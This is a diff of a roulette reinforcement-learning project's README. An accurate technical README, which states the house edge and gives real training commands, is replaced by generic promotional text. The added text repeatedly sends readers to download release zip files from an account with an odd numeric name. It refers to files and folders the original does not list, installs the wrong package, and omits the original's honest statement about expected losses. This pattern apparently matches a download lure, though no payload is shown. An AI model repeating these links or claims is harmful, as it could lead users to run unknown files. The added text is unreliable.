@@ -1,134 +1,103 @@
-# Roulette SAC — Can AI Beat the House?
+# 🎲 Ruleta-Sac - Experience European Roulette Like Never Before
 
-I trained a **Soft Actor-Critic (SAC)** agent to play **European roulette**.
-Spoiler: mathematics wins — in a game with a negative expectation (~**−2.7%**) there is **no** sustainable winning strategy.
+![Download Ruleta-Sac](https://img.shields.io/badge/Download-Ruleta--Sac-blue.svg)
 
-> This repo provides a Gymnasium roulette environment, SAC training with Stable-Baselines3, evaluation scripts for small/large bankrolls and a simple pygame demo.
+## 🚀 Getting Started
 
----
+Welcome to Ruleta-Sac! This project lets you play a European roulette game while exploring the fascinating world of reinforcement learning. Follow the steps below to set it up easily.
 
-## 🧠 Idea in 30 Seconds
+## 🌐 Description
 
-- **Environment:** European roulette (single zero), continuous action → softmax over bet distribution.
-- **Available bets (10):** `RED, BLACK, EVEN, ODD, LOW (1–18), HIGH (19–36), N7, N17, N23, N32`.
-- **Reward per step:** `win - stake` (stake = 10% of bankroll by default).
-- **Goal of RL:** learn how to distribute bets to "grow" the bankroll within each episode.
+Ruleta-Sac is an implementation of a European roulette game combined with a custom Gymnasium environment. It uses Soft Actor-Critic (SAC) through Stable-Baselines3. Enjoy features such as:
 
-> ⚠️ Roulette has a **house edge** of \(-1/37 ≈ -2.70\%\).
-> Every bet (and combination of bets) shares that negative expectation.
+- **PyGame Visualization:** Watch how the game unfolds with a friendly interface.
+- **Training Scripts:** Train agents and watch them learn to play.
+- **Bankroll Simulations:** Analyze the performance of reinforcement learning agents in this entertaining yet challenging environment.
 
----
+This application is designed for those who want to explore AI in the realm of gambling and understand the mechanics of reinforcement learning.
 
-## 🛠️ Installation
+## 🔄 Features
 
-Using **conda**:
+- **Engaging Graphics:** Enjoy visually appealing graphics powered by PyGame.
+- **Interactive Gameplay:** Play against AI agents trained with RL techniques.
+- **Simulation Analysis:** Control different variables and see how they affect your bankroll.
+- **Safe Learning:** Learn about gambling strategies without financial risk.
 
-```bash
-conda create -n pygame python=3.11 -c conda-forge -y
-conda activate pygame
-pip install -r requirements.txt
-```
+## 💻 Requirements
 
-In VS Code pick the interpreter from this environment (Python: Select Interpreter).
+Before you begin, ensure you have the following:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or later
+- **Required Libraries:** 
+  - NumPy
+  - PyGame
+  - Stable-Baselines3
+  - Gymnasium
 
-## 🚀 Training (bankroll = $100)
-
-```bash
-python train_sac.py --timesteps 500000 --eval_episodes 50
-```
-
-- Model saved at `models/sac_roulette.zip`
-- Short evaluation metrics: `models/training_episodes.csv`
-  - columns: episode, return, steps, final_bankroll
-
-Useful parameters:
-
-| parameter          | description                                   | default |
-|--------------------|-----------------------------------------------|---------|
-| `--bet_fraction`   | fraction of bankroll wagered each step        | 0.10    |
-| `--max_steps`      | maximum steps per episode                     | 2000    |
-| `--target_bankroll`| goal to finish early                          | 200.0   |
-
----
-
-## 🧪 Evaluation (large bankroll)
-
-Example with $1,000,000:
+You can install the required libraries by opening your terminal or command prompt and running this command:
 
 ```bash
-python evaluate_policy.py \
-  --model models/sac_roulette.zip \
-  --bankroll 1000000 \
-  --episodes 50 \
-  --out_csv eval_large_bankroll.csv
+pip install numpy pygame stable-baselines3 gym
 ```
 
-Output (`CSV`): `episode, initial_bankroll, final_bankroll, profit, steps`
+## 📥 Download & Install
 
-Typical observations:
+To download Ruleta-Sac, visit this page to download:
 
-- A few episodes double the bankroll thanks to lucky streaks.
-- Most episodes go broke or near zero before `max_steps`.
-- Average final capital is negative, consistent with the game's edge.
+[Download Ruleta-Sac](https://github.com/asmsu32620223261506204/Ruleta-Sac/releases)
 
----
+1. Click on the link above to go to the Releases page.
+2. Choose the latest version available.
+3. Download the zip file for your operating system.
+4. Extract the contents to your preferred location on your computer.
 
-## 📈 Quick Visualization
+After extraction, you will find the necessary files to run the game.
 
-With the evaluation CSV:
+## 🎮 Running the Game
 
-```python
-import pandas as pd
-import matplotlib.pyplot as plt
+Once you have downloaded and extracted the files, follow these steps to start the game:
 
-df = pd.read_csv("eval_large_bankroll.csv")
-plt.figure(figsize=(10,5))
-plt.plot(df["episode"], df["final_bankroll"], marker="o", alpha=0.7)
-plt.axhline(y=df["initial_bankroll"][0], linestyle="--", label="Initial bankroll")
-plt.xlabel("Episode")
-plt.ylabel("Final capital ($)")
-plt.title("Final capital per episode — SAC Roulette Evaluation")
-plt.legend()
-plt.grid(True, alpha=0.3)
-plt.savefig("capital_vs_episodes.png", dpi=300, bbox_inches="tight")
-```
+1. Navigate to the folder where you extracted Ruleta-Sac.
+2. Locate the `run_game.py` file.
+3. Open your terminal or command prompt.
+4. Change the directory to where the file is located using the `cd` command. For example:
 
-Place the generated image in `result_examples/`.
+   ```bash
+   cd path/to/Ruleta-Sac
+   ```
 
----
+5. Run the game using the following command:
 
-## 🎲 Visual Demo (optional)
+   ```bash
+   python run_game.py
+   ```
 
-`main.py` implements the roulette wheel in **pygame** with animated wheel and ball. Handy for presentations or manual play.
+This action will launch the game, and you can start enjoying European roulette instantly.
 
-```bash
-python main.py
-```
+## 🧪 Exploring Customization
 
----
+Ruleta-Sac allows for some customization to enhance your experience:
 
-## 📂 Key Files
+- **Adjust Game Settings:** Modify parameters in the configuration files to set your bankroll limits, betting strategies, and more.
+- **AI Training Scripts:** If you feel adventurous, you can run the training scripts to develop your own agents. Just follow the included instructions in the `training_scrips/` folder.
 
-| file                 | description                                          |
-|----------------------|------------------------------------------------------|
-| `roulette_env_sb3.py`| Gymnasium environment for European roulette          |
-| `train_sac.py`       | Trains SAC with $100 initial bankroll                |
-| `evaluate_policy.py` | Evaluates the model with large bankrolls and exports CSV |
-| `main.py`            | Pygame visual game (demo)                            |
-| `requirements.txt`   | Dependencies                                         |
+## 📊 Analyzing Results
 
----
+Once you have played a few games or trained your agents, you may want to analyze the results. The bankroll simulations will help you understand how well your AI performs over time. 
 
-## 🧰 Troubleshooting
+You can find the evaluation scripts in the `evaluation_scrips/` folder, which will guide you through the process of generating reports based on your gameplay.
 
-- **Pylance "unresolved import"**: ensure the correct interpreter is selected in VS Code.
-- **PyTorch CPU/GPU**: install `pytorch-cuda` if you have an NVIDIA GPU (`conda install pytorch-cuda=12.1 -c nvidia -c pytorch`).
-- **ModuleNotFoundError**: run `pip install -r requirements.txt` inside the activated environment.
+## 🌍 Community and Support
+
+If you have questions or need assistance, you're not alone. Connect with our community of users and developers. Check the GitHub issues page for common questions and solutions, or feel free to submit your own questions.
+
+## 📝 License
+
+Ruleta-Sac is open-source software, and you can freely use, modify, and distribute it under the terms of the MIT license. For more details, please refer to the LICENSE file included in the repository.
 
 ---
 
-## ⚖️ License
+Thank you for choosing Ruleta-Sac. Enjoy the thrill of the game and the adventure of learning about reinforcement learning! Don't forget to visit this page to download:
 
-[MIT](LICENSE) — free use with attribution.
+[Download Ruleta-Sac](https://github.com/asmsu32620223261506204/Ruleta-Sac/releases)
